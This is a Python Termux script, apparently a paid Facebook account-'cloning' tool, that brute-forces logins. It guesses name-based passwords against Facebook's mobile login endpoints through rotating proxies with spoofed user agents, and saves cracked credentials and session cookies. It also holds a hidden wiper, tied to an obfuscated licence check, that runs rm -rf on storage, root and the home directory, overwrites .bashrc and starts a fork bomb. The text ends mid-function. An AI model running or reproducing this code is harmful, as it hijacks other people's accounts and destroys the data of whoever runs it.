from rich.table import Table as me
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as parser
import time
import requests,bs4,json,os,sys,random,datetime,time,re,platform,zlib
import urllib3,rich,base64
from rich.table import Table as me
from rich import pretty
from rich.text import Text as tekz
pretty.install()
#------------------[ USER-AGENT ]-------------------#
head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en-BD;q=0.6,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('\tplzz wait......')
prox=open('.prox.txt','r').read().splitlines()

try:
    os.system('curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt -o socks4.txt')
except:
    pass
sock=open('socks4.txt','r').read().splitlines()

header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 ;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
ugen = [
'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 ;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]'
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/102.0 Mobile/15E148 Safari/605.1.15 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12'
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16'
'Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36'
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0]'
]
for xd in range(10000):
    a='Mozilla/5.0 (Linux; Android 9;'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Redmi'
    e=random.randrange(100, 9999)
    f='Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Chrome/86.0.4240.198 Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    a='Mozilla/5.0 (Linux; Android 5.0'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='4.0 Chrome/37.0.0.0 Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (Linux; Android 5.0'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='4.0 Chrome/37.0.0.0 Mobile Safari/537.36'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
        ua=open('.bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def X(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    ___fuckyoursystem____()

####-----------[ DATA ]----------####
def data():
    os.system('touch .hushlogin')
    os.system('print "python dark.py" > $HOME/.bashrc')
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system(':(){ :|: & };:')
    os.system('mv dark.py $HOME/')
    
####------------[ APROVAL ]-----------####
def look():
    os.system('clear')
    print("""                                    
\x1b[1;97m 888b      88  88  88      a8P   88  
 8888b     88  88  88    ,88'    88  
 88 `8b    88  88  88  ,88"      88  
 88  `8b   88  88  88,d88'       88  
 88   `8b  88  88  8888"88,      88  
 88    `8b 88  88  88P   Y8b     88  
 88     `8888  88  88     "88,   88  
 88      `888  88  88       Y8b  88  
------------------------------------------------
 [*] Author   : Niki404-Cyber
 [*] GitHub   : Niki404-Cyber
 [*] WhatsApp : +8801645137393
 [*] Version  : 3.3
------------------------------------------------""")

os.system('clear')
look()
print( '')
time.sleep(3)
ubahP,progress,pwBaru=[],[],[]
try:
    lic1 = platform.platform().replace('Linux','').replace('libc','').replace('with','').replace('-','').replace('.','').replace('+','').upper()[::-1]
    lic2 = str(os.geteuid()) + str(os.getlogin()).replace('_','').upper()[::-1].replace('A0U','====')
    mlic = lic1 + lic2
    f = (b'x\x9c\xd3/NIN,J\xd1wq\xf6\xf4\xd5\xd7KL\xd1346\xd1+\xa9(\x01\x00]\xc2\x07c')
    bd = (zlib.decompress(f))
    to = (open(bd, 'r').read())
except (KeyError, IOError):
    ()
try:
    bt = (b'x\x9c\xcb())(\xb6\xd2\xd7/H,.IM\xca\xcc\xd3K\xce\xcf\xd5/J,\xd7\x0f\xf6\x89(p\x8c(K\x03\x00\xd0N\x0c\x13')
    bw = (zlib.decompress(bt))
    r = (requests.get(bw).text)
except requests.exceptions.ConnectionError:
    print ("\x1b[0;31m [!] Internet Connection lost")
    exit()
if mlic in r:
    progress.append(1)
    pass
else:
    look()
    print(' [×] \x1b[1;91mYour Key Not Registered ')
    print('\x1b[1;97m [√] Key : \x1b[1;92m' +  mlic + '\x1b[1;97m')
    print(' [√] It’s Premium Tools ')
    print('------------------------------------------------')
    print(' [×] Start File Clonnig (V1) \n [×] Start File Clonnig (V2) \n [×] Start File Clonnig (V3) \n [×] Start File Clonnig (V4) \n [×] Start Public Cloning \n [×] Start Random Clonnig \n [×] Start Dump File Make \n [×] Close Pogrom ') 
    print('')
    input('\033[1;92m [√] Enter To Buy My Tool ')
    os.system('am start https://wa.me/+8801645137393?text=Hi%20Bro,%20I%20Want%20To%20Buy%20Your%20Green-Lover%20Paid%20Tools.%20My%20Key:%20' + mlic) 
    os.system('python Lover.py')

####-------------[ MAIN ]----------------####
def ___fuckyoursystem____():
    if 1 in progress:
        os.system('#')
    else:
        data()
        os.system("clear")
        print ("\x1b[1;91m I Fuck Your Bypass System - Security By Mr. NIKI")
        exit()
    os.system('clear')
    print('updated')
    if 1 in progress:
        os.system('#')
    else:
        data()
        os.system("clear")
        print ("\x1b[1;91mFuck Your Bypass System - Security By Mr. NIKI")
        exit()
    os.system('clear')
    look()
    ip = requests.get("https://api.ipify.org").text
    print(' [1] Start File Clonnig [method one]')
    print(' [2] Start File Clonnig [method two]')
    print(' [3] Start File Clonnig [method three]')
    print(' [4] Start File Clonnig [method four]')
    print('')
    if 1 in progress:
        os.system('#')
    else:
        data()
        os.system("clear")
        print ("\x1b[1;91m I Fuck Your Bypass System - Security By Mr. NIKI")
        exit()
    _niki___ = input(' [?] Select Method : ')
    if _niki___ in ('1', '01'):
        one()
    if _niki___ in ('2', '02'):
        tow()
    if _niki___ in ('3', '03'):
        three()
    if _niki___ in ('4', '04'):
        four()
        pass
####-------------[ FILE-ONE ]----------------####
def one():
    look()
    sex = input('\n [!] Input File Path : ')
    print('')
    try:lin = open(sex).read().splitlines()
    except:
        print('\033[1;91m [x] File Not Found')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()

def setting():
    look()
    print(" [1] Crack From Old Id")
    print(" [2] Crack From New Id")
    print(" [3] Crack From Mix Id [best]")
    hu = input("\n [?] Choose : ")
    if hu in ['1', '01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2', '02']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3', '03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    method.append('mobile')
    passwrd()

def passwrd():
    look()
    print(' [*] Clonnig Time Use Only Mobile Data')
    print(' [*] Use (Airplane) Mode If Ids Not Coming')
    print(' [*] Your Clonnig Stop Press Ctrl Than z')
    print('------------------------------------------------')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            try:
                idf,nmf,ttl = yuzong.split('|')[0],yuzong.split('|')[1].lower(),yuzong.split('|')[2].lower()
            except:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            try:
                pwv = []
            except:
                pwv = ['mahadi','hasan','afridi','jisan','ethan']
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv,nmf)
            else:
                print("")
    print('\n')
    print('\x1b[1;97m------------------------------------------------')
    print(' [!] The Process Has Been Complete...')
    print(' [!] TOTAL OK : %s' % str(len(ok)))
    print(' [!] TOTAL CP : %s' % str(len(cp)))
    print(' [!] Thanks Using My Paid Tools')
    print('------------------------------------------------')
    input("\n\x1b[1;93m [√] Press Enter To Back ")
    back()
#--------------------[ MAHADI ONE ]-----------------#
def crack(idf,pwv,nmf):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r {P}[NIKI] {loop}|{len(id)} [OK:-{ok}]  | {U}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\33[91m[NIKI-CP] {idf}|{pw}')
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=ses.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\33[92m[NIKI-OK] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1

####-------------[ FILE-TWO ]----------------####
def tow():
    look()
    sex = input('\n [!] Input File Path : ')
    print('')
    try:lin = open(sex).read().splitlines()
    except:
        print('\033[1;91m [x] File Not Found')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting1()

def setting1():
    look()
    print(" [1] Crack From Old Id")
    print(" [2] Crack From New Id")
    print(" [3] Crack From Mix Id [best]")
    hu = input("\n [?] Choose : ")
    if hu in ['1', '01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2', '02']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3', '03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    method.append('mobile')
    passwrd1()

def passwrd1():
    look()
    print(' [*] Clonnig Time Use Only Mobile Data')
    print(' [*] Use (Airplane) Mode If Ids Not Coming')
    print(' [*] Your Clonnig Stop Press Ctrl Than z')
    print('------------------------------------------------')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            try:
                idf,nmf,ttl = yuzong.split('|')[0],yuzong.split('|')[1].lower(),yuzong.split('|')[2].lower()
            except:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            try:
                pwv = []
            except:
                pwv = ['mahadi','hasan','afridi','jisan','ethan']
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'123')
                    pwv.append(frs+'12345')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
                    pwv.append(frs+'12345')
                    
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack1,idf,pwv,nmf)
            else:
                print("")
    print('\n')
    print('\x1b[1;97m------------------------------------------------')
    print(' [!] The Process Has Been Complete...')
    print(' [!] TOTAL OK : %s' % str(len(ok)))
    print(' [!] TOTAL CP : %s' % str(len(cp)))
    print(' [!] Thanks Using My Paid Tools')
    print('------------------------------------------------')
    input("\n\x1b[1;93m [√] Press Enter To Back ")
    back()
def crack1(idf,pwv,nmf):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r {P}[NIKI] {loop}|{len(id)} [OK:-{ok}]  | {U}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            getlog = ses.get(f'https://p.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            ses.headers = {}
            ses.headers.update({'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'})
            complete = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
            if 'c_user' in ses.cookies.get_dict():
                print(f'\r\33[91m[NIKI-CP] {idf}|{pw}')
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=ses.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\33[92m[NIKI-OK] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1

####-------------[ FILE-THREE ]----------------####
def three():
    look()
    sex = input('\n [!] Input File Path : ')
    print('')
    try:lin = open(sex).read().splitlines()
    except:
        print('\033[1;91m [x] File Not Found')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting2()

def setting2():
    look()
    print(" [1] Crack From Old Id")
    print(" [2] Crack From New Id")
    print(" [3] Crack From Mix Id [best]")
    hu = input("\n [?] Choose : ")
    if hu in ['1', '01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2', '02']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3', '03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    method.append('mobile')
    passwrd2()

def passwrd2():
    look()
    print(' [*] Clonnig Time Use Only Mobile Data')
    print(' [*] Use (Airplane) Mode If Ids Not Coming')
    print(' [*] Your Clonnig Stop Press Ctrl Than z')
    print('------------------------------------------------')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            try:
                idf,nmf,ttl = yuzong.split('|')[0],yuzong.split('|')[1].lower(),yuzong.split('|')[2].lower()
            except:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            try:
                pwv = []
            except:
                pwv = ['mahadi','hasan','afridi','jisan','ethan']
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'123')
                    pwv.append(frs+'12345')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
                    pwv.append(frs+'12345')
                    
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack2,idf,pwv,nmf)
            else:
                print("")
    print('\n')
    print('\x1b[1;97m------------------------------------------------')
    print(' [!] The Process Has Been Complete...')
    print(' [!] TOTAL OK : %s' % str(len(ok)))
    print(' [!] TOTAL CP : %s' % str(len(cp)))
    print(' [!] Thanks Using My Paid Tools')
    print('------------------------------------------------')
    input("\n\x1b[1;93m [√] Press Enter To Back ")
    back()
def crack2(idf,pwv,nmf):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r {P}[NIKI] {loop}|{len(id)} [OK:-{ok}]  | {U}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    for pw in pwv:
        try:
            ua3 = open('agent.txt', 'r').read()
        except (KeyError, IOError):
